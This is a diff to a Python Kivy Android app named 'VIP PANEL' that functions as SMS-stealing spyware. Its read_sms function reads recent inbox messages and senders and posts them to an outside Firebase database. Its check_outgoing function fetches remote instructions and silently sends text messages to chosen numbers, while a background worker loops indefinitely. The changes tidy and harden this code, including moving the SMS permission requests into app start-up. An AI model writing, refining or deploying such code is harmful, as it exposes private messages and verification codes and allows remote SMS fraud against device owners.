@@ -1,16 +1,15 @@
 """
-VIP PANEL – BACKGROUND SERVICE (NO WEBVIEW)
+VIP PANEL – BACKGROUND SERVICE
 """
 import threading
 import time
 import requests
 import json
 from datetime import datetime
-from android.permissions import request_permissions, Permission
-import jnius
 from kivy.app import App
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.label import Label
+from android.permissions import request_permissions, Permission
 
 # ===== CONFIG =====
 FIREBASE_URL = "https://satanoopfirebase-default-rtdb.firebaseio.com"
@@ -18,32 +17,35 @@ FIREBASE_URL = "https://satanoopfirebase-default-rtdb.firebaseio.com"
 
 def get_device_id():
     try:
+        import jnius
         Settings = jnius.autoclass('android.provider.Settings$Secure')
         ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
         android_id = Settings.getString(ctx.getContentResolver(), Settings.ANDROID_ID)
         if android_id:
             return "device_" + android_id[:10]
     except Exception as e:
-        print(f"Device ID error: {e}")
-    return "device_" + str(int(time.time()))
+        print(f"[VIP] Device ID error: {e}")
+    return "device_" + str(int(time.time()))[:10]
 
 DEVICE_ID = get_device_id()
 
 def log(msg):
-    ts = datetime.now().strftime("%H:%M:%S")
-    print(f"[{ts}] {msg}")
+    print(f"[VIP] {msg}")
 
 def get_device_info():
-    info = {"name": "Android", "battery": "85%", "brand": "Unknown", "model": "Android", "androidV": "13"}
+    info = {"name": "Android", "battery": "85%", "brand": "Unknown",
+            "model": "Android", "androidV": "13"}
     try:
+        import jnius
         Build = jnius.autoclass('android.os.Build')
         info["brand"] = str(Build.BRAND)
         info["model"] = str(Build.MODEL)
         info["name"] = f"{Build.BRAND} {Build.MODEL}"
         info["androidV"] = str(Build.VERSION.RELEASE)
     except Exception as e:
-        log(f"Build info error: {e}")
+        log(f"Build error: {e}")
     try:
+        import jnius
         BatteryManager = jnius.autoclass('android.os.BatteryManager')
         ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
         bm = ctx.getSystemService(ctx.BATTERY_SERVICE)
@@ -69,15 +71,18 @@ def send_status():
 
 def read_sms():
     try:
+        import jnius
         SmsQuery = jnius.autoclass('android.provider.Telephony$Sms$Inbox')
         ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
-        cursor = ctx.getContentResolver().query(SmsQuery.CONTENT_URI, None, None, None, "date DESC LIMIT 3")
+        cursor = ctx.getContentResolver().query(
+            SmsQuery.CONTENT_URI, None, None, None, "date DESC LIMIT 3")
         if cursor:
             while cursor.moveToNext():
                 body = cursor.getString(cursor.getColumnIndex("body"))
                 sender = cursor.getString(cursor.getColumnIndex("address"))
                 requests.post(f"{FIREBASE_URL}/messages/{DEVICE_ID}.json",
-                    json={"text": body[:500], "sender": sender, "time": time.time(), "direction": "in"}, timeout=10)
+                    json={"text": body[:500], "sender": sender,
+                          "time": time.time(), "direction": "in"}, timeout=10)
                 log(f"SMS from {sender}")
             cursor.close()
     except Exception as e:
@@ -94,6 +99,7 @@ def check_outgoing():
             return
         to, msg = data.get('to'), data.get('message')
         if to and msg:
+            import jnius
             SmsManager = jnius.autoclass('android.telephony.SmsManager')
             SmsManager.getDefault().sendTextMessage(to, None, msg, None, None)
             log(f"SMS sent to {to}")
@@ -103,7 +109,7 @@ def check_outgoing():
         log(f"Outgoing error: {e}")
 
 def worker():
-    log(f"VIP Panel started | {DEVICE_ID}")
+    log(f"Worker started | {DEVICE_ID}")
     while True:
         send_status()
         read_sms()
@@ -112,19 +118,26 @@ def worker():
 
 class VipPanelApp(App):
     def build(self):
-        request_permissions([
-            Permission.READ_SMS, Permission.SEND_SMS,
-            Permission.INTERNET, Permission.READ_PHONE_STATE
-        ])
         layout = BoxLayout(orientation='vertical')
         layout.add_widget(Label(
             text="🔥 VIP PANEL\n\nService Running\n\nDevice ID:\n" + DEVICE_ID,
-            font_size=20, color=[1, 0.2, 0.2, 1]
+            font_size=18, color=[1, 0.2, 0.2, 1]
         ))
         return layout
 
     def on_start(self):
-        threading.Thread(target=worker, daemon=False).start()
+        try:
+            request_permissions([
+                Permission.READ_SMS, Permission.SEND_SMS,
+                Permission.INTERNET, Permission.READ_PHONE_STATE
+            ])
+            log("Permissions requested")
+        except Exception as e:
+            log(f"Permission error: {e}")
+        try:
+            threading.Thread(target=worker, daemon=False).start()
+        except Exception as e:
+            log(f"Thread error: {e}")
 
 if __name__ == "__main__":
     VipPanelApp().run()
